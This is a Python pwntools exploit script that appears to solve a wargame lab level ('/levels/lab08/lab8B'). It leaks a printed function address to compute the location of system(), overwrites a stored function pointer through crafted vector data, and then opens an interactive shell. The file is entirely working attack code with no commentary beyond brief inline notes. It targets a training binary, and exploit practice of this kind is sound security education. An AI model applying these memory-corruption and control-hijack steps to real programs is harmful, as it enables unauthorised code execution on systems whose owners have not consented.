import re
from pwn import *

def insert_vector_data(proc_obj, vec_index, poisoned_uint_e):
    proc_obj.sendline("1") # select enter data command
    proc_obj.sendline(str(vec_index)) # which vector?
    
    # inserting 1 until getting to the input of int d
    for _ in range(4):
        proc_obj.sendline("1")

    proc_obj.sendline(str(poisoned_uint_e))

    for _ in range(4):
        proc_obj.sendline("1")

    proc_obj.clean()

def poison_data(proc_obj, system_addr):
    insert_vector_data(proc_obj=proc_obj, vec_index=1, poisoned_uint_e=system_addr-1)
    insert_vector_data(proc_obj=proc_obj, vec_index=2, poisoned_uint_e=1)

    proc_obj.sendline("2") # Sum the vectors to receive a int d with system_addr in it

    # Save v3 face and save each time another starting ptr until starting from int d of v3
    for _ in range(5):
        proc_obj.sendline("4")
    
    proc_obj.clean()

    proc_obj.sendline("6")
    proc_obj.sendline("4")
    proc_obj.sendline("1")

    proc_obj.sendline("3")
    proc_obj.sendline("1")
    proc_obj.interactive()

def get_vector_info(proc_obj, vec_index):
    proc_obj.sendline("3")
    proc_obj.sendline(str(vec_index))
    return proc_obj.recv()

def create_vector_with_ones(proc_obj, vec_index):
    proc_obj.sendline("1") # select enter data command
    proc_obj.sendline(str(vec_index)) # which vector?
    
    # Each data entry will be 1
    for _ in range(9):
        proc_obj.sendline("1")
    
    proc_obj.recv()

def leak_system_addr(proc_obj):
    create_vector_with_ones(proc_obj=proc_obj, vec_index=1)
    vec_res_text = get_vector_info(proc_obj=proc_obj, vec_index=1)
    
    printf_func_addr_str = re.search(".*void printFunc: (.*?)\\n.*", vec_res_text, flags=re.MULTILINE).groups()[0]
    printf_func_addr = int(printf_func_addr_str, base=16)

    print("Found printf addr from vector {}: {}".format(1, hex(printf_func_addr)))
    
    return printf_func_addr - 66

def main():
    p = process('/levels/lab08/lab8B')

    system_addr = leak_system_addr(proc_obj=p)
    print("Found system addr: {}".format(hex(system_addr)))
    p.clean()

    print("Poisoning the faves list")
    poison_data(proc_obj=p, system_addr=system_addr)

if __name__ == "__main__":
    main()